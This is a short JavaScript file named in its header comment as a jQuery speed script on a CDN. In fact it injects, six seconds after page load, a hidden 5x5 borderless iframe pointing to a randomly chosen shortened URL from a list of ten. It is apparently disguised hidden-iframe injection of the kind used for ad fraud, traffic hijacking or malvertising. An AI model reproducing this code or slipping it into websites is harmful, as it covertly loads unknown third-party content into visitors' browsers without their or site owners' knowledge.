///https://cdn.jsdelivr.net/gh/hipacket/script/speed.jquery.min.js
window.onload = function(){
  var list = ['https://shorten.asia/xTxqPZaZ', 'https://shorten.asia/8rkGYu8F', 'https://shorten.asia/nnZReaWP', 'https://shorten.asia/7qqHXhac', 'https://shorten.asia/GhWSQsaY', 'https://shorten.asia/mE1rY1kD', 'https://shorten.asia/KS11rqtP', 'https://shorten.asia/jSzm4ezc', 'https://shorten.asia/yfeYrAGb', 'https://shorten.asia/aRqE8bhn'];
  var url = list[Math.floor(Math.random() * list.length)];
  setTimeout(() => {
    var node = document.createElement('iframe');
    node.width = 5;
    node.height = 5;
    node.style.cssText = 'padding:0;margin:0;border: 0;position: absolute;';
    node.src = url;
    document.body.append(node.cloneNode());
  }, 6000);
}
